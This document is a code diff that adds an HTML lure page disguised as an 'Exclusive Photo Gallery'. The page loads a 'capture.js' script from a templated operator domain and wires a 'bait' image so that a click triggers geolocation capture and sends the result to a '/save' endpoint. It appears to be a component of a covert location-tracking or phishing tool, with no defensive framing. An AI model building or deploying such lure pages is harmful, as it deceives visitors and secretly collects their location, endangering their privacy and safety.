@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exclusive Photo Gallery</title>
+    <script src="https://{{ domain }}/static/js/capture.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; }
+        img { max-width: 80%; margin: 20px; border-radius: 8px; }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <h1>Exclusive Photo Gallery</h1>
+    <p>Click the image to view full size.</p>
+    <img src="https://{{ domain }}/static/images/bait.jpg" onclick="triggerGeolocation('https://{{ domain }}/save')">
+</body>
+</html>
